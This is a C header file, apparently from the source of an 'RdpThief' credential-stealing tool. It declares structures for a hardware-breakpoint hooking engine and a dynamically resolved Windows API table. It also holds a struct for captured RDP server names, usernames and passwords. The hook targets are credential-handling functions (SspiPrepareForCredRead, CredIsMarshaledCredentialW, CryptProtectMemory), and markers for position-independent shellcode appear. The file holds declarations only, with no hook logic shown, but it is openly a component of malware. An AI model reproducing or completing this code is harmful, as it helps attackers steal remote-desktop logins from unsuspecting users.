#ifndef RDPTHIEF_STRUCT_H
#define RDPTHIEF_STRUCT_H

#include <windows.h>
#include <iphlpapi.h>
#include <macros.h>
#include <tlhelp32.h>


#include <stdio.h>


typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemHandleInformation = 16,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45,
    SystemCodeIntegrityInformation = 103,
    SystemPolicyInformation = 134,
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

EXTERN_C ULONG __Instance_offset;

#ifdef DEBUG // MSVCRT PRINTF
typedef int                 (WINAPI * PRINTF)                   (const char* format, ...);
#endif
typedef int                 (WINAPI * _SNPRINTF_S)              ( char* const _Buffer, size_t const _BufferCount, size_t const _MaxCount, char const* const _Format, ...);
typedef size_t              (WINAPI * STRLEN)                   ( const char *_Str);
typedef void*               (WINAPI * MEMMOVE)                  ( void* _Dst, void const* _Src, size_t _Size );
typedef int                 (WINAPI * STRNCMP)                  ( const char *_Str1,const char *_Str2,size_t _MaxCount);
typedef char*               (WINAPI * STRTOK_S)                 ( char *_Str,const char *_Delim,char **_Context);
// NTDLL
typedef PVOID               (NTAPI * RTLALLOCATEHEAP)           (PVOID HeapHandle, ULONG Flags, SIZE_T Size);
typedef NTSTATUS            (NTAPI * NTPROTECTVIRTUALMEMORY)    (HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
typedef ULONG               (NTAPI * RTLRANDOMEX)               (PULONG Seed);
typedef NTSTATUS            (NTAPI * RTLGETVERSION)( POSVERSIONINFOEXW lpVersionInformation);
typedef NTSTATUS            (NTAPI * NtQuerySystemInformation)( SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

typedef struct Global_Hardware_Breakpoint_Object{
    HANDLE HandlerObject;
    BOOL IsInit;
} HANDLER_OBJECT, *PHANDLER_OBJECT;

typedef enum DRX {
    Dr0,
    Dr1,
    Dr2,
    Dr3
} DRX, * pDRX;

typedef struct DESCRIPTOR_ENTRY {
    uintptr_t                       Address;
    DRX                             Drx;
    DWORD                           ThreadId;
    VOID(*CallbackFunction)(PCONTEXT);
    BOOL                            Processed;
    struct DESCRIPTOR_ENTRY*        Next;
    struct DESCRIPTOR_ENTRY*        Previous;
}DESCRIPTOR_ENTRY, * pDESCRIPTOR_ENTRY;

typedef struct BUFFER {
    PVOID Buffer;
    ULONG Length;
} BUFFER, *pBUFFER;

typedef struct WINAPIS {
    struct {
        WIN32_FUNC(LoadLibraryA)
        WIN32_FUNC(LocalAlloc)
        WIN32_FUNC(LocalFree)
        WIN32_FUNC(GetCurrentProcessId)
        WIN32_FUNC(CloseHandle)
        WIN32_FUNC(ReadFile)
        WIN32_FUNC(GetCurrentThreadId)
        WIN32_FUNC(OpenThread)
        WIN32_FUNC(GetThreadContext)
        WIN32_FUNC(SetThreadContext)
        WIN32_FUNC(LeaveCriticalSection)
        WIN32_FUNC(InitializeCriticalSection)
        WIN32_FUNC(AddVectoredExceptionHandler)
        WIN32_FUNC(EnterCriticalSection)
        WIN32_FUNC(RemoveVectoredExceptionHandler)
        WIN32_FUNC(DeleteCriticalSection)
    } Kernel32Dll;

    struct {
        _SNPRINTF_S _snprintf_s;
        STRLEN strlen;
        MEMMOVE memmove;
        STRNCMP strncmp;
        STRTOK_S strtok_s;
    } MsvcrtDLL;

    struct {
        RTLALLOCATEHEAP RtlAllocateHeap;
        NTPROTECTVIRTUALMEMORY NtProtectVirtualMemory;
        RTLRANDOMEX RtlRandomEx;
        RTLGETVERSION RtlGetVersion;
        NtQuerySystemInformation _NtQuerySystemInformation;
    } NtdllDll;

    struct {
        HANDLE kernel32;
        HANDLE ntdll;
        HANDLE msvcrt;
        HANDLE SspiCli;
        HANDLE Advapi32;
        HANDLE Crypt32;
    } HandlesDll;

    struct SensitiveInfo {
        LPCWSTR g_lpServer;
        LPCWSTR g_lpTempPassword;
        LPCWSTR g_lpUsername;
    }SensitiveInfo, *pSensitiveInfo;

    struct HwbpEngine {
        HANDLER_OBJECT GlobalHardwareBreakpointObject;
        CRITICAL_SECTION	    g_CriticalSection;
        DESCRIPTOR_ENTRY*       g_Head;
        PVOID 	                g_pNtCreateThreadEx;
        PVOID			        g_VectorHandler;
        PVOID*                  g_Ret;
    }HwbpEngine, *pHwbpEngine;

    struct HwbpAPIs{
        PVOID SspiPrepareForCredRead;
        PVOID CredIsMarshaledCredentialW;
        PVOID CryptProtectMemory;
        WIN32_FUNC(MessageBoxA);
        WIN32_FUNC(_snwprintf_s);
        WIN32_FUNC(CreateFileW);
        WIN32_FUNC(wcslen);
        WIN32_FUNC(WriteFile);
        WIN32_FUNC(SetNamedPipeHandleState);
    }HwbpAPIS, *pHwbpApIs;

} WINAPIS, *PWINAPIS;


EXTERN_C PVOID StRipStart();
EXTERN_C PVOID StRipEnd();


#endif //RDPTHIEF_STRUCT_H
